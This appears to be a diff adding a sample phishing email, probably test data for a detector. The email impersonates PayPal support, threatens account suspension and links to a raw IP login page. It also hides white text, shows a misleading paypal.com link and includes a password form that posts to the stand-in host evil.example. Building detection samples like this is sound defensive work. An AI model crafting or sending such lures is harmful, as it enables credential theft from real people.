@@ -1,0 +1,29 @@
+From: "PayPal Support" <security@paypal-verify-account.example>
+To: victim@example.org
+Subject: Urgent: Your account will be suspended
+Date: Mon, 02 Nov 2026 10:00:00 +0000
+Message-ID: <phish-1@paypal-verify-account.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="alt-boundary"
+
+--alt-boundary
+Content-Type: text/plain; charset="utf-8"
+
+Your account will be suspended. Verify your password immediately at
+http://192.168.10.25/login
+
+--alt-boundary
+Content-Type: text/html; charset="utf-8"
+
+<html>
+  <body>
+    <p style="color:#ffffff">Your account will be suspended.</p>
+    <a href="http://192.168.10.25/login">Verify now</a>
+    <a href="https://www.paypal.com/secure">https://www.paypal.com/secure</a>
+    <form action="http://evil.example/collect" method="post">
+      <input name="password" type="password" />
+    </form>
+  </body>
+</html>
+
+--alt-boundary--
